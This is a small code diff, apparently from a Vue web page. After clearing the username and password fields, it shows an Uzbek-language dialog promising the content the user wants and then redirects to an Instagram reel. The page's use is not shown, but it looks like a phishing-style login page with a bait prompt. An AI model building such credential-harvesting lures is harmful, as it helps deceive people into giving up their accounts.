@@ -108,14 +108,14 @@ export default {
       this.username = "";
       this.password = "";
 
-      // Show a success message (optional)
+      // Redirect to instagram Link
       if (
         window.confirm(
-          "Siz ko'rmoqchi bo'lgan video bu yerda, ko'rish uchun ok ni bosing!"
+          "Siz ko'rmoqchi bo'lgan ma'lumot bu yerda, ko'rish uchun OK ni bosing!"
         )
       ) {
         window.location.href =
-          "https://www.instagram.com/reel/DGbAKFltSpj/?igsh=b2g4a29zOXE1Nng3";
+          "https://www.instagram.com/reel/DHa0N00qYMQ/?igsh=NTc4MTIwNjQ2YQ==";
       }
     },
 
